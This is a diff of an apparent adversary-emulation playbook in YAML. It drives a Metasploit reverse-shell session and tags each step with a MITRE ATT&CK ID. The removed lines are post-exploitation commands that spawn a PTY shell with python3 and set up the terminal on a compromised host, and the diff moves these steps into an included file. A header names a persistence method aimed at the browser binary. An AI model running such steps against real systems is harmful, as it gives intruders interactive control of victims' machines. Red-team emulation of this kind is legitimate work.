@@ -173,55 +173,13 @@ commands:
 
 ################### ATTACKER GATHERS INFORMATION ############################
 
-  # get interactive shell
-  - type: msf-session
-    cmd: shell
-    session: revshell
-    metadata:
-      techniques: "T1059.004"
-      tactics: "Execution"
-      technique_name: "Command and Scripting Interpreter: Unix Shell"
+  # Prepare for upgradeshell
+  - type: setvar
+    cmd: revshell
+    variable: $UPGRADESESSION
 
-  - type: msf-session
-    cmd: python3 -c "import pty;pty.spawn(\"/bin/bash\")";
-    session: revshell
-    metadata:
-      techniques: "T1059.004"
-      tactics: "Execution"
-      technique_name: "Command and Scripting Interpreter: Unix Shell"
- 
-  - type: msf-session
-    cmd: export SHELL=bash
-    session: revshell
-    metadata:
-      techniques: "T1059.004"
-      tactics: "Execution"
-      technique_name: "Command and Scripting Interpreter: Unix Shell"
- 
-  - type: msf-session
-    cmd: export TERM=xterm256-color
-    session: revshell
-    metadata:
-      techniques: "T1059.004"
-      tactics: "Execution"
-      technique_name: "Command and Scripting Interpreter: Unix Shell"
-
-  - type: msf-session
-    cmd: stty rows 38 columns 116
-    session: revshell
-    metadata:
-      techniques: "T1059.004"
-      tactics: "Execution"
-      technique_name: "Command and Scripting Interpreter: Unix Shell"
-
-  # needed for xclip and wmctrl
-  - type: msf-session
-    cmd: export DISPLAY=:0
-    session: revshell
-    metadata:
-      techniques: "T1059.004"
-      tactics: "Execution"
-      technique_name: "Command and Scripting Interpreter: Unix Shell"
+  - type: include
+    local_path: upgrade.yml
 
 ################### PERSISTENCE OPTION A, BROWSER BINARY ############################
 
